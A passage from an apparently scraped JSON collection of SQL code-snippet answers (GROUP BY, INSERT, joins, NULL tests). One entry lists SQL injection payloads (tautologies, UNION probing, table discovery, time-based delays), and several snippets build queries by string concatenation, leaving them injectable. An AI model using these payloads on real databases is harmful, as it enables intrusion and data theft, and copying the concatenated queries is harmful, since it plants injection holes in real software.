    "reg_date": "2021-10-12T10:00:16.000Z"
  },
  {
    "id": 3932,
    "keyword": null,
    "link": null,
    "title": " sql getdate date only",
    "description": "-- MS SQL Server SELECT CAST(getdate() AS date); SELECT CAST(getdate() AS varchar(10));\n",
    "reg_date": "2021-10-12T10:00:16.000Z"
  },
  {
    "id": 3933,
    "keyword": null,
    "link": null,
    "title": " sql getdate minus 1 day without time",
    "description": "DATEADD(DAY, -30, GETDATE()) \n",
    "reg_date": "2021-10-12T10:00:16.000Z"
  },
  {
    "id": 3934,
    "keyword": null,
    "link": null,
    "title": " sql groub by count",
    "description": "SELECT COUNT(DISTINCT program_name) AS Count,   program_type AS [Type]  FROM cm_production  WHERE push_number=@push_number  GROUP BY program_type\nSELECT COUNT(Id), Country    FROM Customer  GROUP BY Country\n",
    "reg_date": "2021-10-12T10:00:16.000Z"
  },
  {
    "id": 3935,
    "keyword": null,
    "link": null,
    "title": " sql group by and select all columns",
    "description": "select t1.* from sch.mytable t1 join (     SELECT min(id) as id     FROM sch.mytable      GROUP BY key ) t2 on t1.id = t2.id \n",
    "reg_date": "2021-10-12T10:00:16.000Z"
  },
  {
    "id": 3936,
    "keyword": null,
    "link": null,
    "title": " sql group by error",
    "description": "SET GLOBAL sql_mode='STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION'; SET SESSION sql_mode='STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION';\n",
    "reg_date": "2021-10-12T10:00:16.000Z"
  },
  {
    "id": 3937,
    "keyword": null,
    "link": null,
    "title": " sql group by example",
    "description": "GROUP BY: is used to collaborate with the SELECT statement to arrange  matching data into groups.  ORDER BY: is for sorting result either in descending or ascending order.\n--- GROUP FUNCTION | MULTI ROW FUNCTION | AGGREGATE FUNCTION  --- COUNT , MAX , MIN , SUM , AVG\n SELECT column_name(s)   FROM table_name   WHERE condition   GROUP BY column_name(s)   HAVING condition   ORDER BY column_name(s); \nSELECT `gender` FROM `members` GROUP BY `gender`;\nclass groupby(object):     # [k for k, g in groupby('AAAABBBCCDAABBB')] --> A B C D A B     # [list(g) for k, g in groupby('AAAABBBCCD')] --> AAAA BBB CC D     def __init__(self, iterable, key=None):         if key is None:             key = lambda x: x         self.keyfunc = key         self.it = iter(iterable)         self.tgtkey = self.currkey = self.currvalue = object()     def __iter__(self):         return self     def next(self):         while self.currkey == self.tgtkey:             self.currvalue = next(self.it)    # Exit on StopIteration             self.currkey = self.keyfunc(self.currvalue)         self.tgtkey = self.currkey         return (self.currkey, self._grouper(self.tgtkey))     def _grouper(self, tgtkey):         while self.currkey == tgtkey:             yield self.currvalue             self.currvalue = next(self.it)    # Exit on StopIteration             self.currkey = self.keyfunc(self.currvalue) \nSELECT <field1, field2, field3&hellip;> FROM <table1_name> WHERE <condition/expression> GROUP BY <field1, field2, field3&hellip;>\n",
    "reg_date": "2021-10-12T10:00:16.000Z"
  },
  {
    "id": 3938,
    "keyword": null,
    "link": null,
    "title": " sql group by sum",
    "description": "// Use SQL Group By clause after the Where clause // Any column in the select list must either be in the Group By clause  // or part of an agregation statement, like the Sum() statement // Multiple columns can be included in the Group By Clause seperated by a comma // Multiple columns stipulate the order tree. Order by  // first column, then second ... etc  Select LastName, FirstName, Sum(LeaveDays), Max(age) From EmployeeProjects Where StartDate > '2020-01-01' Group By LastName, FirstName\n",
    "reg_date": "2021-10-12T10:00:16.000Z"
  },
  {
    "id": 3939,
    "keyword": null,
    "link": null,
    "title": " sql group by sum with condition",
    "description": "SELECT CityID,         COUNT(*) NumberOfDogsInThisCity,        SUM(CASE WHEN DogName = 'Tedy' THEN Wheight ELSE 0 END) WheightOfAllDogWithNameTedy FROM Dogs GROUP BY CityID\nSELECT cust_city, SUM (opening_amt + receive_amt)  FROM customer  GROUP BY cust_city; \n// Use SQL Group By clause after the Where clause // Any column in the select list must either be in the Group By clause  // or part of an agregation statement, like the Sum() statement // Multiple columns can be included in the Group By Clause seperated by a comma // Multiple columns stipulate the order tree. Order by  // first column, then second ... etc  Select LastName, FirstName, Sum(LeaveDays), Max(age) From EmployeeProjects Where StartDate > '2020-01-01' Group By LastName, FirstName\n-- SELECT SUM(<column_name>) FROM <table_name> WHERE <condition> <group by>; SELECT SUM(amount) FROM invoices; SELECT client_name, SUM(amount) FROM invoices GROUP BY client_name;\n",
    "reg_date": "2021-10-12T10:00:16.000Z"
  },
  {
    "id": 3940,
    "keyword": null,
    "link": null,
    "title": " sql group by year",
    "description": "SELECT value1, extract(YEAR FROM my_date) FROM my_table GROUP BY value1, extract(YEAR FROM my_date);\n",
    "reg_date": "2021-10-12T10:00:17.000Z"
  },
  {
    "id": 3941,
    "keyword": null,
    "link": null,
    "title": " sql headers delphi",
    "description": "Procedure blablabla; var i:integer; begin ..... {some code here}  SQLQuery1.Open;   for i := 0 to SQLQuery1.FieldCount-1 do     begin;     Memo1.Lines.Append(SQLQuery1.Fields[i].DisplayName);     end;   SQLQuery1.Close;   .... {some code here}  end; \n",
    "reg_date": "2021-10-12T10:00:17.000Z"
  },
  {
    "id": 3942,
    "keyword": null,
    "link": null,
    "title": " sql hours between two dates",
    "description": "DATEDIFF ( hour, start_date , end_date )\n",
    "reg_date": "2021-10-12T10:00:17.000Z"
  },
  {
    "id": 3943,
    "keyword": null,
    "link": null,
    "title": " sql how to duplicate a table",
    "description": "CREATE TABLE new_table LIKE original_table; INSERT INTO new_table SELECT * FROM original_table;\n",
    "reg_date": "2021-10-12T10:00:17.000Z"
  },
  {
    "id": 3944,
    "keyword": null,
    "link": null,
    "title": " sql how to partition rank",
    "description": "BY LOVE SINGH, Here, name and id is the column name of the table tbltest.  SELECT \tname, \tRANK () OVER (  \t\tORDER BY id DESC \t) price_rank  FROM \ttbltest;\n                                     SELECT * FROM ( \tSELECT \t\tproduct_id, \t\tproduct_name, \t\tbrand_id, \t\tlist_price, \t\tRANK () OVER (  \t\t\tPARTITION BY brand_id \t\t\tORDER BY list_price DESC \t\t) price_rank  \tFROM \t\tproduction.products ) t WHERE price_rank <= 3;\n",
    "reg_date": "2021-10-12T10:00:17.000Z"
  },
  {
    "id": 3945,
    "keyword": null,
    "link": null,
    "title": " sql how to replace full stop",
    "description": "SELECT REPLACE(REPLACE(REPLACE(`column_name`, ',', ''), '.', ''), '-', '')  FROM `table_name`\n",
    "reg_date": "2021-10-12T10:00:17.000Z"
  },
  {
    "id": 3946,
    "keyword": null,
    "link": null,
    "title": " sql if clause within where clause",
    "description": "WHERE OrderNumber LIKE   CASE WHEN IsNumeric(@OrderNumber) = 1 THEN      @OrderNumber    ELSE     '%' + @OrderNumber   END \n",
    "reg_date": "2021-10-12T10:00:17.000Z"
  },
  {
    "id": 3947,
    "keyword": null,
    "link": null,
    "title": " sql if empty then",
    "description": "SELECT COALESCE(NULLIF(SomeColumn,''), ReplacementColumn) FROM SomeTable \nIF ISNULL(@param) OR @param = '' THEN doSomething...\n",
    "reg_date": "2021-10-12T10:00:17.000Z"
  },
  {
    "id": 3948,
    "keyword": null,
    "link": null,
    "title": " sql if statement in where clause multiple values",
    "description": "SELECT CASE col1 \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 >= 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\nSELECT * FROM suppliers WHERE (state = 'California' AND supplier_id <> 900) OR (supplier_id = 100);\nSQL> SELECT ID, NAME, SALARY  FROM CUSTOMERS WHERE SALARY > 2000 OR age < 25;\n+----+----------+----------+ | ID | NAME     | SALARY   | +----+----------+----------+ |  3 | kaushik  |  2000.00 | |  4 | Chaitali |  6500.00 | |  5 | Hardik   |  8500.00 | |  6 | Komal    |  4500.00 | |  7 | Muffy    | 10000.00 | +----+----------+----------+ \n",
    "reg_date": "2021-10-12T10:00:17.000Z"
  },
  {
    "id": 3949,
    "keyword": null,
    "link": null,
    "title": " sql in",
    "description": "Used alongside a WHERE clause as a shorthand for multiple OR conditions. So instead of: SELECT * FROM users WHERE country = 'USA' OR country = 'United Kingdom' OR country = 'Russia' OR country = 'Australia'; You can use: SELECT * FROM users WHERE country IN ('USA', 'United Kingdom', 'Russia', 'Australia');\n (IN) operator in sql like \"OR\" operator For example:  Select * From employees Where department_id \"IN\" (60,90);  \nSQL NOT IN operator is used to filter the result if the values that are mentioned as part of the IN operator is not satisfied. Let&rsquo;s discuss in detail about SQL NOT IN operator.  Syntax: SELECT Column(s) FROM table_name WHERE Column NOT IN (value1, value2... valueN);\nSELECT Id, FirstName, LastName, Country  FROM Customer WHERE Country IN        (SELECT Country           FROM Supplier) \nSELECT EmpId FROM EmployeeDetails UNION  SELECT EmpId FROM EmployeeSalary; \nSELECT EmpId, Salary+Variable as TotalSalary  FROM EmployeeSalary; \n",
    "reg_date": "2021-10-12T10:00:17.000Z"
  },
  {
    "id": 3950,
    "keyword": null,
    "link": null,
    "title": " sql in array query",
    "description": "$ids = join(\"','\",$galleries);    $sql = \"SELECT * FROM galleries WHERE id IN ('$ids')\";\n",
    "reg_date": "2021-10-12T10:00:18.000Z"
  },
  {
    "id": 3951,
    "keyword": null,
    "link": null,
    "title": " sql indexes",
    "description": "CREATE INDEX Creates an index named &lsquo;idx_test&rsquo; on the first_name and surname columns of the users table. In this instance, duplicate values are allowed. CREATE INDEX idx_test ON users (first_name, surname); CREATE UNIQUE INDEX Creates an index named &lsquo;idx_test&rsquo; on the first_name and surname columns of the users table. In this instance, duplicate values are allowed. CREATE UNIQUE INDEX idx_test ON users (first_name, surname); DROP INDEX Creates an index named &lsquo;idx_test&rsquo; on the first_name and surname columns of the users table. In this instance, duplicate values are allowed. ALTER TABLE users DROP INDEX idx_test;\n",
    "reg_date": "2021-10-12T10:00:18.000Z"
  },
  {
    "id": 3952,
    "keyword": null,
    "link": null,
    "title": " sql injection",
    "description": "-- Examples of SQL injections: \" or \"\"=\" 105 OR 1=1\n$value = \"your value here\";  try {             $pdo = new PDO($dsn, $username, $password, $>drivers);         } catch (\\PDOException $e) {             echo 'Connection Failed: ' . $e->getMessage();         }          $sql = \"INSERT INTO `my_db` SET `field` = ? \"; $stmt = $this->pdo->prepare($sql);         $stmt->bindValue(1, $value, PDO::PARAM_STR);         $stmt->execute();         $stmt = null;\nString tableName; switch(PARAM):   case \"Value1\": tableName = \"fooTable\";                  break;   case \"Value2\": tableName = \"barTable\";                  break;   ...   default      : throw new InputValidationException(\"unexpected value provided\"                                         \n",
    "reg_date": "2021-10-12T10:00:18.000Z"
  },
  {
    "id": 3953,
    "keyword": null,
    "link": null,
    "title": " sql injection payload list github",
    "description": "' '' ` `` , \" \"\" / // \\ \\\\ ; ' or \" -- or #  ' OR '1 ' OR 1 -- - \" OR \"\" = \" \" OR 1 = 1 -- - ' OR '' = ' '=' 'LIKE' '=0--+  OR 1=1 ' OR 'x'='x ' AND id IS NULL; -- '''''''''''''UNION SELECT '2 \u0000 /*&hellip;*/  +\t\taddition, concatenate (or space in url) ||\t\t(double pipe) concatenate %\t\twildcard attribute indicator  @variable\tlocal variable @@variable\tglobal variable   # Numeric AND 1 AND 0 AND true AND false 1-false 1-true 1*56 -2   1' ORDER BY 1--+ 1' ORDER BY 2--+ 1' ORDER BY 3--+  1' ORDER BY 1,2--+ 1' ORDER BY 1,2,3--+  1' GROUP BY 1,2,--+ 1' GROUP BY 1,2,3--+ ' GROUP BY columnnames having 1=1 --   -1' UNION SELECT 1,2,3--+ ' UNION SELECT sum(columnname ) from tablename --   -1 UNION SELECT 1 INTO @,@ -1 UNION SELECT 1 INTO @,@,@  1 AND (SELECT * FROM Users) = 1\t  ' AND MID(VERSION(),1,1) = '5';  ' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --   Finding the table name   Time-Based: ,(select * from (select(sleep(10)))a) ,(select * from (select(sleep(10)))a) ';WAITFOR DELAY '0:0:30'--  Comments:  #\t    Hash comment /*  \tC-style comment -- -\tSQL comment ;\u0000\tNullbyte `\t    Backtick \n",
    "reg_date": "2021-10-12T10:00:18.000Z"
  },
  {
    "id": 3954,
    "keyword": null,
    "link": null,
    "title": " sql inner join",
    "description": "SELECT column_name(s) FROM table1 INNER JOIN table2 ON table1.column_name = table2.column_name;\nINNER JOIN is used when retrieving data from multiple tables and will return only matching data.  example= Select P.FIRST_NAME , M.DRUG_ID FROM PATIENTS P INNER JOIN MEDICATIONS M ON P.PATIENTS_ID = M.PATIENTS_ID\n-- Rows with ID existing in both a, b and c -- JOIN is equivalent to INNER JOIN SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    JOIN table2 b ON a.ID = b.ID   JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000; -- &dArr; Test it &dArr; (Fiddle source link)\n1234567SELECT columns  FROM table_A  INNER JOIN table_B     ON join_conditions1 AND join_conditions2  INNER JOIN table_C    ON join_conditions3 OR join_conditions4...XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n123SELECT columns  FROM table_A  INNER JOIN table_B ON join_conditionsXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n",
    "reg_date": "2021-10-12T10:00:18.000Z"
  },
  {
    "id": 3955,
    "keyword": null,
    "link": null,
    "title": " sql inner join sprcific columns",
    "description": "SELECT     t1.* -- All columns from table1     ,     t2.columnName -- Just that column from table2     ,     t3.columnName -- And just that column from table3  FROM     table1 AS t1      INNER JOIN table2 as t2         ON t1.id = t2.table1_id      INNER JOIN table3 AS t3         ON t1.id = t3.table1_id \n",
    "reg_date": "2021-10-12T10:00:18.000Z"
  },
  {
    "id": 3956,
    "keyword": null,
    "link": null,
    "title": " sql insert",
    "description": "--sql insert quest example INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...); \n-- Note: This is specifically for SQL - Oracle -- --------------------------------------------------------------- -- OPTION 1: Insert specific values (other values will be null)  -- syntax  INSERT INTO <TABLE_NAME> (<column1>,<column2>,<column3>,...)  VALUES (<value1>,<value2>,<value3>,...);  -- example INSERT INTO SALES (SALE_ID,ITEM_ID,QUANTITY,AMOUNT) VALUES (631,13,4,59.99); -- --------------------------------------------------------------- -- OPTION 2: Insert a value for every field  -- syntax INSERT INTO <TABLE_NAME> VALUES (<value1>,<value2>,...,<valueN>);  -- example (SALES table only consists of 4 columns) INSERT INTO SALES VALUES (631,13,4,59.99); -- ---------------------------------------------------------------\nINSERT INTO table2 SELECT * FROM table1 WHERE condition;\nINSERT INTO client (prenom, nom, ville, age)  VALUES  ('R&eacute;becca', 'Armand', 'Saint-Didier-des-Bois', 24),  ('Aim&eacute;e', 'Hebert', 'Marigny-le-Ch&acirc;tel', 36),  ('Marielle', 'Ribeiro', 'Maill&egrave;res', 27),  ('Hilaire', 'Savary', 'Conie-Molitard', 58);\nINSERT INTO table_name (a, b) VALUES (val1, val2);  INSERT INTO table_name (a, b) VALUES (val1, val2), (val3, val4); -- 2 rows  -- From a query: INSERT INTO table_name (a, b)  \tSELECT val1 AS a, val2 AS b      FROM source_table s \tWHERE s.val1 >= 10;\ndef insert_picked(name):     insert_sql = \"INSERT INTO picked(name, time) VALUES ('{}', {})\".format(name, time())     conn.execute(insert_sql)     conn.commit() \n",
    "reg_date": "2021-10-12T10:00:18.000Z"
  },
  {
    "id": 3957,
    "keyword": null,
    "link": null,
    "title": " sql insert data",
    "description": "--sql insert quest example INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...); \nINSERT INTO table_name (a, b) VALUES (val1, val2);  INSERT INTO table_name (a, b) VALUES (val1, val2), (val3, val4); -- 2 rows  -- From a query: INSERT INTO table_name (a, b)  \tSELECT val1 AS a, val2 AS b      FROM source_table s \tWHERE s.val1 >= 10;\n/*No List parameters */ INSERT INTO table_name  VALUES (value1, value2, value3, ...); \nAdd new rows to a table. Example: Adds a new vehicle. INSERT INTO cars (make, model, mileage, year) VALUES ('Audi', 'A3', 30000, 2016);\nIt is possible to write the INSERT INTO statement in two ways:  1. Specify both the column names and the values to be inserted: INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...);  2. If you are adding values for all the columns of the table, you do not need to specify the column names in the SQL query. However, make sure the order of the values is in the same order as the columns in the table. Here, the INSERT INTO syntax would be as follows: INSERT INTO table_name VALUES (value1, value2, value3, ...); \nINSERT INTO users (first_name, last_name, address, email) VALUES (&lsquo;Tester&rsquo;, &lsquo;Jester&rsquo;, &lsquo;123 Fake Street, Sheffield, United Kingdom&rsquo;, &lsquo;test@lukeharrison.dev&rsquo;);\n",
    "reg_date": "2021-10-12T10:00:18.000Z"
  },
  {
    "id": 3958,
    "keyword": null,
    "link": null,
    "title": " sql insert for each distinct value",
    "description": "insert into your_table (col1, col2, col3) select distinct col1, 'newval', col3 from your_table\n",
    "reg_date": "2021-10-12T10:00:18.000Z"
  },
  {
    "id": 3959,
    "keyword": null,
    "link": null,
    "title": " sql insert from excel",
    "description": "Copy into Excel =\" INSERT INTO Table_Product (TBNID, PRODUCT , PRICE) values ('\"&H2&\"','\"&I2&\"','\"&J2&\"') ;\" Then change the Cell locations and drag down.\n",
    "reg_date": "2021-10-12T10:00:18.000Z"
  },
  {
    "id": 3960,
    "keyword": null,
    "link": null,
    "title": " sql insert inserted id",
    "description": "-- Never use @@identity or scope_identity() -- they can not always be relied upon  DECLARE @Ids_tbl TABLE ([id] INT); -- Requires table. use variable for scope INSERT INTO [sometable] ([ColA],[ColB]) OUTPUT INSERTED.ID INTO @Ids_tbl(id) VALUES ('valA','valB');  SELECT [id] FROM @Ids_tbl; -- <-- Id(s) in here  \n",
    "reg_date": "2021-10-12T10:00:18.000Z"
  },
  {
    "id": 3961,
    "keyword": null,
    "link": null,
    "title": " sql insert into",
    "description": "--sql insert quest example INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...); \n-- Note: This is specifically for SQL - Oracle -- --------------------------------------------------------------- -- OPTION 1: Insert specific values (other values will be null)  -- syntax  INSERT INTO <TABLE_NAME> (<column1>,<column2>,<column3>,...)  VALUES (<value1>,<value2>,<value3>,...);  -- example INSERT INTO SALES (SALE_ID,ITEM_ID,QUANTITY,AMOUNT) VALUES (631,13,4,59.99); -- --------------------------------------------------------------- -- OPTION 2: Insert a value for every field  -- syntax INSERT INTO <TABLE_NAME> VALUES (<value1>,<value2>,...,<valueN>);  -- example (SALES table only consists of 4 columns) INSERT INTO SALES VALUES (631,13,4,59.99); -- ---------------------------------------------------------------\nINSERT INTO table2 SELECT * FROM table1 WHERE condition;\nINSERT INTO client (prenom, nom, ville, age)  VALUES  ('R&eacute;becca', 'Armand', 'Saint-Didier-des-Bois', 24),  ('Aim&eacute;e', 'Hebert', 'Marigny-le-Ch&acirc;tel', 36),  ('Marielle', 'Ribeiro', 'Maill&egrave;res', 27),  ('Hilaire', 'Savary', 'Conie-Molitard', 58);\nINSERT INTO table_name (a, b) VALUES (val1, val2);  INSERT INTO table_name (a, b) VALUES (val1, val2), (val3, val4); -- 2 rows  -- From a query: INSERT INTO table_name (a, b)  \tSELECT val1 AS a, val2 AS b      FROM source_table s \tWHERE s.val1 >= 10;\nAdd new rows to a table. Example: Adds a new vehicle. INSERT INTO cars (make, model, mileage, year) VALUES ('Audi', 'A3', 30000, 2016);\n",
    "reg_date": "2021-10-12T10:00:19.000Z"
  },
  {
    "id": 3962,
    "keyword": null,
    "link": null,
    "title": " sql insert multiple rows from select",
    "description": "  INSERT INTO table2      (name, email, phone)      SELECT name, email, phone      FROM table1; \nINSERT INTO my_table SELECT * FROM source_table; INSERT INTO my_table (a, b, c) SELECT a, b, c FROM source_table; INSERT INTO my_table (a, b, c) SELECT a, b, c FROM source_table s \tWHERE s.my_col >= 10;\n",
    "reg_date": "2021-10-12T10:00:19.000Z"
  },
  {
    "id": 3963,
    "keyword": null,
    "link": null,
    "title": " sql insert or update",
    "description": "-- Oracle: Example for Insert or update in t1 from t2 values  MERGE INTO table1 t1 USING table2 t2 ON (t1.CODE = t2.ID) WHEN MATCHED THEN     UPDATE SET t1.COL1 = t2.VALUE1 WHEN NOT MATCHED THEN     INSERT (CODE, COL1)  VALUES (t2.ID, t2.VALUE1);  -- MySql (makes a INSERT + DELETE if existing) REPLACE INTO table1 (pk_id, col1) VALUES (5, 'aaaa'); -- INSERT INTO table1 VALUES (key, generation) ON DUPLICATE KEY UPDATE (key = key, generation = generation + 1);\n",
    "reg_date": "2021-10-12T10:00:19.000Z"
  },
  {
    "id": 3964,
    "keyword": null,
    "link": null,
    "title": " sql insert query",
    "description": "--sql insert quest example INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...); \n-- Note: This is specifically for SQL - Oracle -- --------------------------------------------------------------- -- OPTION 1: Insert specific values (other values will be null)  -- syntax  INSERT INTO <TABLE_NAME> (<column1>,<column2>,<column3>,...)  VALUES (<value1>,<value2>,<value3>,...);  -- example INSERT INTO SALES (SALE_ID,ITEM_ID,QUANTITY,AMOUNT) VALUES (631,13,4,59.99); -- --------------------------------------------------------------- -- OPTION 2: Insert a value for every field  -- syntax INSERT INTO <TABLE_NAME> VALUES (<value1>,<value2>,...,<valueN>);  -- example (SALES table only consists of 4 columns) INSERT INTO SALES VALUES (631,13,4,59.99); -- ---------------------------------------------------------------\nINSERT INTO TABLE_NAME [(column1, column2, column3,...columnN)]    VALUES (value1, value2, value3,...valueN); \nINSERT INTO table_name (a, b) VALUES (val1, val2);  INSERT INTO table_name (a, b) VALUES (val1, val2), (val3, val4); -- 2 rows  -- From a query: INSERT INTO table_name (a, b)  \tSELECT val1 AS a, val2 AS b      FROM source_table s \tWHERE s.val1 >= 10;\n-- sql insert using string format           -- you dont need to do this unless you want to specify what                   --    columns you want to insert                                  ⬇️ String = \"INSERT INTO Marcas (yourcolumn) VALUES(if your value is string use 'your string' and if is a number you dont use the '')\";  -- exemple:                                                      -- because my idcostumer just allows numbers   and that is a text one and i use the ''                                                                                              --    and i dont use the ''                                                                           ⬇️                             ⬇️   ssql = \"INSERT INTO Costumer (idcostumer, costumername) VALUES(\"textboxidcostumer.Text + \", '\" + textboxname.Text + \"')\";\n/*No List parameters */ INSERT INTO table_name  VALUES (value1, value2, value3, ...); \n",
    "reg_date": "2021-10-12T10:00:19.000Z"
  },
  {
    "id": 3965,
    "keyword": null,
    "link": null,
    "title": " sql insert timestamp",
    "description": "INSERT INTO TABLE_NAME (TIMESTAMP_VALUE) VALUES (TO_TIMESTAMP('2014-07-02 06:14:00.742000000', 'YYYY-MM-DD HH24:MI:SS.FF')); \n",
    "reg_date": "2021-10-12T10:00:19.000Z"
  },
  {
    "id": 3966,
    "keyword": null,
    "link": null,
    "title": " sql insert to values",
    "description": "--sql insert quest example INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...); \nAdds a new column to an existing table. Example: Adds a new column named &lsquo;email_address&rsquo; to a table named &lsquo;users&rsquo;. ALTER TABLE users ADD email_address varchar(255);\nAdd new rows to a table. Example: Adds a new vehicle. INSERT INTO cars (make, model, mileage, year) VALUES ('Audi', 'A3', 30000, 2016);\nINSERT INTO name (...) VALUES (...) Used alongside the INSERT INTO keyword to add new values to a table. Example: Adds a new car to the cars table. INSERT INTO cars (name, model, year) VALUES ('Ford', 'Fiesta', 2010);\n",
    "reg_date": "2021-10-12T10:00:19.000Z"
  },
  {
    "id": 3967,
    "keyword": null,
    "link": null,
    "title": " sql insert values into table",
    "description": "--sql insert quest example INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...); \nINSERT INTO table2 SELECT * FROM table1 WHERE condition;\n INSERT INTO Customers (CustomerName, City, Country)  VALUES ('Cardinal', 'Stavanger', 'Norway');  \n",
    "reg_date": "2021-10-12T10:00:19.000Z"
  },
  {
    "id": 3968,
    "keyword": null,
    "link": null,
    "title": " sql is not null",
    "description": "SELECT column_name FROM table_name  WHERE column_name IS NOT NULL;\nSELECT column_names FROM table_name WHERE column_name IS NOT NULL;\nSELECT column_name FROM table_name  WHERE column_name IS NULL;\nSELECT * FROM my_table WHERE my_column IS NOT NULL;\nSELECT FIRST_NAME , MANAGER_ID  FROM EMPLOYEES  WHERE MANAGER_ID IS NOT NULL ;\nThe reverse of NULL. Tests for values that aren&rsquo;t empty / NULL \"Tests for empty (NULL) values. Example: Returns users that haven&rsquo;t given a contact number. SELECT * FROM users WHERE contact_number IS NULL;\"\n",
    "reg_date": "2021-10-12T10:00:19.000Z"
  },
  {
    "id": 3969,
    "keyword": null,
    "link": null,
    "title": " sql is null",
    "description": "SELECT column_name FROM table_name  WHERE column_name IS NOT NULL;\nSELECT column_names FROM table_name WHERE column_name IS NOT NULL;\nSELECT column_name FROM table_name  WHERE column_name IS NULL;\nTests for empty (NULL) values. Example: Returns users that haven&rsquo;t given a contact number. SELECT * FROM users WHERE contact_number IS NULL;\ndeclare @col varchar(255), @cmd varchar(max)  DECLARE getinfo cursor for SELECT c.name FROM sys.tables t JOIN sys.columns c ON t.Object_ID = c.Object_ID WHERE t.Name = 'ADDR_Address'  OPEN getinfo  FETCH NEXT FROM getinfo into @col  WHILE @@FETCH_STATUS = 0 BEGIN     SELECT @cmd = 'IF NOT EXISTS (SELECT top 1 * FROM ADDR_Address WHERE [' + @col + '] IS NOT NULL) BEGIN print ''' + @col + ''' end'     EXEC(@cmd)      FETCH NEXT FROM getinfo into @col END  CLOSE getinfo DEALLOCATE getinfo\nBy default, a column can hold NULL values. The NOT NULL constraint enforces a column to NOT accept NULL values. This enforces a field to always contain a value, which means that you cannot insert a new record, or update a record without adding a value to this field.  Sql NOT NULL in creating a table CREATE TABLE Persons (     ID int NOT NULL,     LastName varchar(255) NOT NULL,     FirstName varchar(255) NOT NULL,     Age int );\n",
    "reg_date": "2021-10-12T10:00:19.000Z"
  },
  {
    "id": 3970,
    "keyword": null,
    "link": null,
    "title": " sql join 3 tables",
    "description": "-- LEFT OUTER JOIN is equivalent to LEFT JOIN -- b.VALUE1 is null when ID not in table2 (idem for c.VALUE1 in table3) SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    LEFT OUTER JOIN table2 b ON a.ID = b.ID   LEFT OUTER JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000;  -- &dArr; Test it &dArr; (Fiddle source link)\n-- Rows with ID existing in both a, b and c -- JOIN is equivalent to INNER JOIN SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    JOIN table2 b ON a.ID = b.ID   JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000; -- &dArr; Test it &dArr; (Fiddle source link)\nSELECT column-names   FROM table-name1 JOIN table-name2      ON column-name1 = column-name2  WHERE condition\nSuppose we are having three table named as  Student_details Attendance_details Batch_details And we have to apply join these three tables for fetching records  Example query: select column_names from Student_detail as s join Attendance_details as a on s.s_id = a.s_id join Batch_details as b on  s.s_id = b.s_id;  Here in the above example we implemented simple join but you change it with own join requirements.\n",
    "reg_date": "2021-10-12T10:00:19.000Z"
  },
  {
    "id": 3971,
    "keyword": null,
    "link": null,
    "title": " sql join 3 tables on id",
    "description": "-- Rows with ID existing in both a, b and c -- JOIN is equivalent to INNER JOIN SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    JOIN table2 b ON a.ID = b.ID   JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000; -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T10:00:20.000Z"
  },
  {
    "id": 3972,
    "keyword": null,
    "link": null,
    "title": " sql join 3 tables with where clause",
    "description": "-- LEFT OUTER JOIN is equivalent to LEFT JOIN -- b.VALUE1 is null when ID not in table2 (idem for c.VALUE1 in table3) SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    LEFT OUTER JOIN table2 b ON a.ID = b.ID   LEFT OUTER JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000;  -- &dArr; Test it &dArr; (Fiddle source link)\n-- Rows with ID existing in both a, b and c -- JOIN is equivalent to INNER JOIN SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    JOIN table2 b ON a.ID = b.ID   JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000; -- &dArr; Test it &dArr; (Fiddle source link)\nSELECT column-names   FROM table-name1 JOIN table-name2      ON column-name1 = column-name2  WHERE condition\n",
    "reg_date": "2021-10-12T10:00:20.000Z"
  },
  {
    "id": 3973,
    "keyword": null,
    "link": null,
    "title": " sql join on a subquery",
    "description": "SELECT *  FROM ( SELECT ... FROM ... ) q1  INNER JOIN  ( SELECT ... FROM ... ) q2  ON q1.colname = q2.colname\n",
    "reg_date": "2021-10-12T10:00:20.000Z"
  },
  {
    "id": 3974,
    "keyword": null,
    "link": null,
    "title": " sql join on comma separated field",
